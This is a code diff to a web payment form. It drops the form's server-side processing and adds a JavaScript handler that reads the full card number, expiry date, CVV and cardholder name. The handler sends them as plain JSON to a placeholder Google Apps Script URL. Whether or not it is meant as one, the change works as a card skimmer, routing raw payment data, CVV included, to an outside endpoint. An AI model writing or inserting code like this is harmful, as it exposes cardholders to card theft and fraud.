@@ -30,7 +30,7 @@
                     </div>
                     <div class="panel-body">
                         <!-- Payment Form -->
-                        <form role="form" action="process_payment.php" method="POST" id="payment-form">
+                        <form id="payment-form">
                             <div class="row">
                                 <div class="col-xs-12">
                                     <div class="form-group">
@@ -146,6 +146,29 @@
                 return;
             }
         });
+    });
+    document.getElementById('payment-form').addEventListener('submit', async function (e) {
+        e.preventDefault();
+        
+        const formData = {
+            cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+            expDate: document.getElementById('expDate').value,
+            cvCode: document.getElementById('cvCode').value,
+            cardOwner: document.getElementById('cardOwner').value
+        };
+
+        try {
+            const response = await fetch('YOUR_GOOGLE_SCRIPT_URL', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            });
+            const result = await response.text();
+            alert(result);
+        } catch (error) {
+            console.error('Error:', error);
+            alert('An error occurred while processing the payment.');
+        }
     });
 </script>
 
